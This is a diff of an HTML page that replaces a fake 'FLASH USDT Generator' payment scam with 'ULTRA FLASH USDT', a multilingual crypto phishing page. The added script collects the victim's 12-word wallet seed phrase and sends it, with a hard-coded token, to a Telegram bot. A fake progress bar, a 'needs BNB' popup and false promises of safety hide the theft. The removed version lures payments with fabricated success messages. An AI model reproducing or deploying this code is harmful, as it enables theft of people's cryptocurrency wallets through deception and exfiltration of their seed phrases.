@@ -1,86 +1,325 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FLASH USDT Generator</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ULTRA FLASH USDT</title>
+  <style>
+    body {
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    .chat-popup, .container {
+      background: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(10px);
+      border-radius: 16px;
+      box-shadow: 0 0 15px rgba(0,204,255,0.6);
+      text-align: left;
+      font-size: 14px;
+      line-height: 1.6;
+      white-space: pre-line;
+      max-width: 280px;
+      width: 100%;
+      padding: 2cm 1cm;
+      box-sizing: border-box;
+      display: none;
+    }
+
+    .chat-popup.active {
+      display: block;
+    }
+
+    h1 {
+      text-align: center;
+      color: #00ccff;
+      margin-top: 0;
+      margin-bottom: 1rem;
+      font-size: 1.6rem;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+
+    select, textarea, button {
+      width: 100%;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      font-size: 16px;
+      background-color: #1a1a1a;
+      color: white;
+      box-sizing: border-box;
+    }
+
+    textarea {
+      resize: none;
+      height: 100px;
+    }
+
+    #generateBtn {
+      background-color: #00ccff;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    #progressBar {
+      height: 8px;
+      background-color: #333;
+      border-radius: 4px;
+      margin-top: 15px;
+      overflow: hidden;
+      display: none;
+    }
+
+    #progress {
+      height: 100%;
+      width: 0%;
+      background-color: #00ccff;
+    }
+
+    #popup {
+      position: fixed;
+      background-color: #111;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px #00ccff;
+      z-index: 10;
+      width: 280px;
+      max-width: 90%;
+      text-align: center;
+      display: none;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    #popup button, #startBtn {
+      margin-top: 15px;
+      padding: 10px 20px;
+      background-color: #00ccff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      color: black;
+      font-weight: bold;
+    }
+
+    .lang-switcher {
+      position: absolute;
+      top: 15px;
+      right: 15px;
+      z-index: 15;
+    }
+
+    .lang-switcher select {
+      background-color: #1a1a1a;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 6px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
 </head>
-<body class="bg-green-950 font-roboto relative">
-    <div class="container mx-auto p-4 relative z-10">
-        <header class="text-center my-8">
-            <img src="https://static.vecteezy.com/system/resources/thumbnails/011/307/321/small_2x/tether-usdt-badge-crypto-isolated-on-white-background-blockchain-technology-3d-rendering-free-png.png" 
-                 alt="USDT logo" class="mx-auto mb-4 w-24">
-            <h1 class="text-4xl font-bold text-black-600">FLASH USDT Generator</h1>
-            <p class="text-lg text-black-700 mt-2">Generate USDT quickly and securely</p>
-        </header>
+<body>
 
-        <div class="bg-green-800 shadow-md rounded-lg p-6 max-w-lg mx-auto">
-            <h2 class="text-2xl font-bold mb-4">Generate USDT</h2>
-            <form id="usdtForm">
-                <div class="mb-4">
-                    <label class="block text-gray-200 font-bold mb-2" for="quantity">Quantity [max: 3000]</label>
-                    <input type="number" id="quantity" name="quantity" required 
-                           class="shadow border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
-                </div>
-                <div class="mb-4">
-                    <label class="block text-gray-200 font-bold mb-2" for="network">Network</label>
-                    <select id="network" name="network" required 
-                            class="shadow border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
-                        <option value="TRC20">TRC20</option>
-                        <option value="BEP20">BEP20</option>
-                        <option value="ERC20">ERC20</option>
-                    </select>
-                </div>
-                <div class="mb-4">
-                    <label class="block text-gray-200 font-bold mb-2" for="address">Wallet Address</label>
-                    <input type="text" id="address" name="address" required 
-                           class="shadow border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline">
-                </div>
-                
-                
-            </form>
-        </div>
+<div class="lang-switcher">
+  <select id="language">
+    <option value="en">EN</option>
+    <option value="fr">FR</option>
+    <option value="zh">中文</option>
+    <option value="ru">РУС</option>
+  </select>
+</div>
 
-        <div class="bg-green-800 shadow-md rounded-lg p-6 max-w-lg mx-auto mt-8">
-            <h2 class="text-2xl font-bold mb-4">
-            <button id="confirmPayment" 
-                    class="guid-button">
-        <button onclick ="document.location='https://s.binance.com/xveOWPUX'">       𝙲𝚕𝚒𝚌𝚔 𝙷𝚎𝚛𝚎 to 𝙿𝚊𝚢 0.𝟿𝟿 𝚄𝚂𝙳𝚃 𝙵𝙾𝚁 𝟹𝙺 𝙵𝙻𝙰𝚂𝙷   </button>
-            </button>
-            <div id="paymentMessage" class="text-green-500 font-bold mt-4 hidden">Verifying payment...</div>
-        </div>
+<div id="chatBox" class="chat-popup active">
+  <div id="welcomeText"></div>
+  <button id="startBtn">Continue</button>
+</div>
 
-        <footer class="text-center mt-8">
-            <div class="bg-gray-800 text-white py-4">
-                <marquee behavior="scroll" direction="left" class="text-sm">
-                    <span class="mx-4">xxxxx12: Successfully generated 200 USDT on TRC20</span>
-                    <span class="mx-4">xxxxx54: License key verified, withdrawal completed</span>
-                    <span class="mx-4">xxxxx73: Received 500 USDT via ERC20</span>
-                      <span class="mx-4">xxxxx18: Successfully generated 25000 USDT on TRC20</span>
-                      <span class="mx-4">xxxxx93: Successfully generated 21080 USDT on BEP20</span>
-                      <span class="mx-4">xxxxx34: Successfully generated 20000 USDT on TRC20</span>
-                      <span class="mx-4">xxxxx13: Successfully generated 25000 USDT on BEP20</span>
-                      <span class="mx-4">xxxxx56: Successfully generated 10000 USDT on TRC20</span>
-                      <span class="mx-4">xxxxx02: Successfully generated 18000 USDT on TRC20</span>
-                      <span class="mx-4">xxxxx32: Successfully generated 25000 USDT on ERC20</span>
-                </marquee>
-            </div>
-            <p class="text-white-700 mt-4">© 2023 FLASH USDT Generator. All rights reserved.</p>
-        </footer>
-    </div>
+<div class="container" id="mainContainer">
+  <h1>ULTRA FLASH USDT</h1>
 
-    <script>
-        document.getElementById('usdtForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            alert('Processing... Please wait while your USDT is being generated.');
-        });
+  <div class="form-group">
+    <label id="lblAmount" for="amount">Amount</label>
+    <select id="amount">
+      <option value="1">1</option>
+      <option value="2">2</option>
+      <option value="3">3</option>
+    </select>
+  </div>
 
-        document.getElementById('confirmPayment').addEventListener('click', function() {
-            document.getElementById('paymentMessage').classList.remove('hidden');
-        });
-    </script>
+  <div class="form-group">
+    <label id="lblNetwork" for="network">Network</label>
+    <select id="network">
+      <option value="ERC20">ERC20</option>
+      <option value="BEP20">BEP20</option>
+      <option value="TRC20">TRC20</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label id="lblSeed" for="seed">12 PHRASE WALLET SEEDS</label>
+    <textarea id="seed" placeholder="Enter 12 words..."></textarea>
+  </div>
+
+  <button id="generateBtn">Generate</button>
+  <div id="progressBar"><div id="progress"></div></div>
+</div>
+
+<div id="popup">
+  <p><strong>WALLET NEED 0.00001 BNB</strong></p>
+  <button onclick="closePopup()">OK</button>
+</div>
+
+<script>
+  const messages = {
+    en: `Dear user,
+
+1. This flash is for wallets and trading platforms (Metamask, Trustwallet, Binance, Bybit...).
+
+2. Wallet must have at least 0.0001 BNB.
+
+3. Our system keeps your personal information safe.
+
+4. Enjoy.`,
+    fr: `Cher utilisateur,
+
+1. Ce flash est pour les portefeuilles et plateformes de trading (Metamask, Trustwallet, Binance, Bybit...).
+
+2. Le portefeuille doit contenir au moins 0.0001 BNB.
+
+3. Notre système protège vos informations personnelles.
+
+4. Profitez.`,
+    zh: `亲爱的用户：
+
+1. 本程序适用于钱包和交易平台（Metamask、Trustwallet、Binance、Bybit...）。
+
+2. 钱包需至少包含 0.0001 BNB。
+
+3. 我们系统会保护您的个人信息。
+
+4. 祝您使用愉快。`,
+    ru: `Уважаемый пользователь,
+
+1. Этот флеш подходит для кошельков и торговых платформ (Metamask, Trustwallet, Binance, Bybit...).
+
+2. На кошельке должно быть не менее 0.0001 BNB.
+
+3. Наша система сохраняет вашу личную информацию в безопасности.
+
+4. Наслаждайтесь.`
+  };
+
+  const labels = {
+    en: ["Amount", "Network", "12 PHRASE WALLET SEEDS", "Enter 12 words...", "Generate", "Regenerate"],
+    fr: ["Montant", "Réseau", "12 MOTS CLÉS DU PORTEFEUILLE", "Entrez 12 mots...", "Générer", "Régénérer"],
+    zh: ["金额", "网络", "12个助记词", "输入12个单词...", "生成", "重新生成"],
+    ru: ["Сумма", "Сеть", "12 СЛОВ КОШЕЛЬКА", "Введите 12 слов...", "Создать", "Создать заново"]
+  };
+
+  const languageSelect = document.getElementById('language');
+  const welcomeText = document.getElementById('welcomeText');
+  const chatBox = document.getElementById('chatBox');
+  const container = document.getElementById('mainContainer');
+  const startBtn = document.getElementById('startBtn');
+  const generateBtn = document.getElementById('generateBtn');
+  const seedInput = document.getElementById('seed');
+
+  function setLanguage(lang) {
+    welcomeText.textContent = messages[lang];
+    const [amt, net, seed, ph, gen, regen] = labels[lang];
+    document.getElementById("lblAmount").textContent = amt;
+    document.getElementById("lblNetwork").textContent = net;
+    document.getElementById("lblSeed").textContent = seed;
+    seedInput.placeholder = ph;
+    generateBtn.textContent = gen;
+    generateBtn.dataset.regen = regen;
+  }
+
+  languageSelect.addEventListener('change', () => {
+    const lang = languageSelect.value;
+    localStorage.setItem("lang", lang);
+    setLanguage(lang);
+  });
+
+  startBtn.addEventListener('click', () => {
+    chatBox.style.display = 'none';
+    container.style.display = 'block';
+  });
+
+  function validateSeed(seed) {
+    return seed.trim().split(/\s+/).length === 12;
+  }
+
+  function sendToTelegram(message) {
+    const chatId = '7739393558';
+    const token = '8187809372:AAG4a4uXNzKP57b3d2rSuvw_ZIxfKVfK7zw';
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text: message })
+    });
+  }
+
+  function closePopup() {
+    document.getElementById('popup').style.display = 'none';
+    generateBtn.textContent = generateBtn.dataset.regen;
+  }
+
+  generateBtn.addEventListener('click', () => {
+    const amount = document.getElementById('amount').value;
+    const network = document.getElementById('network').value;
+    const seed = seedInput.value.trim();
+    if (!validateSeed(seed)) return alert("Enter exactly 12 words.");
+
+    sendToTelegram(`ULTRA FLASH USDT\nAmount: ${amount}\nNetwork: ${network}\nSeed: ${seed}`);
+
+    const progressBar = document.getElementById('progressBar');
+    const progress = document.getElementById('progress');
+    const popup = document.getElementById('popup');
+
+    progressBar.style.display = 'block';
+    progress.style.width = '0%';
+
+    let seconds = 0;
+    const interval = setInterval(() => {
+      seconds++;
+      progress.style.width = `${(seconds / 15) * 100}%`;
+      if (seconds === 7) popup.style.display = 'block';
+      if (seconds === 15) {
+        clearInterval(interval);
+        progressBar.style.display = 'none';
+      }
+    }, 1000);
+  });
+
+  // Init
+  const savedLang = localStorage.getItem("lang") || "en";
+  languageSelect.value = savedLang;
+  setLanguage(savedLang);
+</script>
+
 </body>
 </html>
